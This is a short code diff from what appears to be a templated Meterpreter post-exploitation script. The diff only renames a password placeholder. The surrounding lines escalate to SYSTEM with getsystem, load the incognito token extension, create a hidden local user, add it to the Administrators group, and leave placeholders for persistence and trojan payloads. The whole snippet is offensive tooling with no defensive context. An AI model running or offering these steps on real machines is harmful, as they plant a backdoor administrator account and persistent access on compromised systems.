@@ -1,7 +1,7 @@
 				session.load_priv
 				session.load_incognito				
 				session.run_cmd('getsystem')
-				session.sys.process.execute("net user /add #!TS_ADMIN_USER!# #!TS_ADMIN_PASSWORD!#")
+				session.sys.process.execute("net user /add #!TS_ADMIN_USER!# #!TS_ADMIN_PASS!#")
 				session.sys.process.execute("net localgroup Administrators #!TS_ADMIN_USER!# /add")
 				#!TS_AUTOPOST_PERSISTENCE!#
 				#!TS_AUTOPOST_TROJANS!#
